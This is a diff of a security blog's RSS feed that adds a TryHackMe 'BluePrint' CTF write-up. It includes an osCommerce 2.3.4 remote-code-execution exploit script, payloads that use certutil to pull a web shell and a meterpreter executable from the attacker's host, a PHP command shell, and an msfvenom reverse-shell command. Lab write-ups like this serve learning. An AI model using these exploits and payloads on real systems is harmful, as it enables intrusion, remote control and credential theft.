@@ -1,4 +1,93 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Sat, 11 Apr 2020 14:31:37 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Sat, 11 Apr 2020 16:01:53 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>BluePrint TryHackMe | write-up</title><description>&lt;p&gt;Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
+Starting Nmap 7.80 ( https:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/blueprint-tryhackme-write-up/</link><guid isPermaLink="false">5e91be87387469077d4030e9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Sat, 11 Apr 2020 13:09:40 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/blueprint.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/blueprint.jpg" alt="BluePrint TryHackMe | write-up"&gt;&lt;p&gt;Hello everyone, today's is really fun rated as easy, and we get no hints or instruction, only one question as a note:&lt;/p&gt;&lt;p&gt;	 &lt;strong&gt;"Do you have what is takes to hack into this Windows Machine?"&lt;/strong&gt;&lt;/p&gt;&lt;blockquote&gt;ENUMERATION TIME&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.41.176
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 12:43 UTC
+Nmap scan report for ip-10-10-41-176.eu-west-1.compute.internal (10.10.41.176)
+Host is up (0.00042s latency).
+Not shown: 991 closed ports
+PORT      STATE SERVICE     VERSION
+135/tcp   open  msrpc       Microsoft Windows RPC
+139/tcp   open  netbios-ssn Windows 7 Home Basic 7601 Service Pack 1 netbios-ssn
+443/tcp   open  ssl/http    Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+3306/tcp  open  mysql       MariaDB (unauthorized)
+8080/tcp  open  http        Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
+|_http-title: Index of /
+49152/tcp open  msrpc       Microsoft Windows RPC
+49153/tcp open  msrpc       Microsoft Windows RPC
+49154/tcp open  msrpc       Microsoft Windows RPC
+49158/tcp open  msrpc       Microsoft Windows RPC
+MAC Address: 02:B2:F0:03:D8:00 (Unknown)
+Service Info: Hosts: www.example.com, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
+|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:b2:f0:03:d8:00 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: BLUEPRINT
+|   NetBIOS computer name: BLUEPRINT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2020-04-11T13:44:15+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-11T12:44:16
+|_  start_date: 2020-04-11T12:43:15
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.89 seconds
+root@kali:~# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we have a lot of ports open, the most attractive one for more recon is port 8080&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-13.58.59.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;we can see that it's hosting a oscommerce-2.3.4&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.20.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;diving in the directory we found, leads us to this ugly e-shopping website, next thing we need to do, accumulate data about the version of the oscommerce and examine if it's vulnerable to anything.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-16.06.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;and we have some goodies over here, went through each one and the RCE one seems compatible with our target and well documented&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-14.07.30.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;the exploit is written with python, we modified the script with the target we have and the specific port, the directory of the exploitable &lt;strong&gt;install.php&lt;/strong&gt; should be the same, or it won't work, here exactly where fundamentals in coding are really important, it helps a lot following the exploit which leads to understanding why exactly it is exploitable and with that knowledge, you can modify or even create you own script write it in bash or any preferable language ... I suggest for anyone just starting in the field to gain some coding skills.&lt;/p&gt;&lt;figure class="kg-card kg-code-card"&gt;&lt;pre&gt;&lt;code class="language-python"&gt;import requests
+
+# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
+base_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/"
+target_url = "http://10.10.41.176:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"
+
+data = {
+    'DIR_FS_DOCUMENT_ROOT': './'
+}
+
+# the payload will be injected into the configuration file via this code
+# '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .
+# so the format for the exploit will be: '); PAYLOAD; /*
+
+payload = '\');'
+payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/shell.php shell.php");'
+payload += 'echo $var;'
+payload += '/*'
+
+
+data['DB_DATABASE'] = payload
+
+# exploit it
+r = requests.post(url=target_url, data=data)
+
+if r.status_code == 200:
+    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
+else:
+    print("[-] Exploit did not execute as planned")&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;shell.php contains | &amp;lt;?php $cmd=$_GET['cmd']; system($cmd);?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.&lt;/p&gt;&lt;p&gt;running the file &lt;strong&gt;configure.php&lt;/strong&gt; in the directory &lt;strong&gt;/oscommerce-2.3.4/catalog/install/inclues/&lt;/strong&gt; will execute our pushed payload and upload our shell&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.44.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;I use python to create a simple server to share files.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.34.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/3q7cjJmyZv7lS" width="480" height="362" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/admin-nowadays-3q7cjJmyZv7lS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &amp;gt; Service_system_update.exe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the &lt;strong&gt;configure.php&lt;/strong&gt; file from the includes directory.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = '\');'
+payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
+payload += 'echo $var;'
+payload += '/*'&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.11.48.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.12.58.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the &lt;strong&gt;NTLM&lt;/strong&gt; hash of the user Lab, the password is very common you can decrypt it just in &lt;strong&gt;crackstation.net&lt;/strong&gt;, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://crackstation.net/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-publisher"&gt;MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://crackstation.net/images/1by1.gif" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" alt="BluePrint TryHackMe | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Simon Scannell&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;Exploit Database&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.exploit-db.com/images/spider-orange.png" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
 Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/inclusion-ctf-write-up/</link><guid isPermaLink="false">5e9086505e61514e230adcb9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 10 Apr 2020 14:45:16 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" alt="Inclusion | CTF write-up"&gt;&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
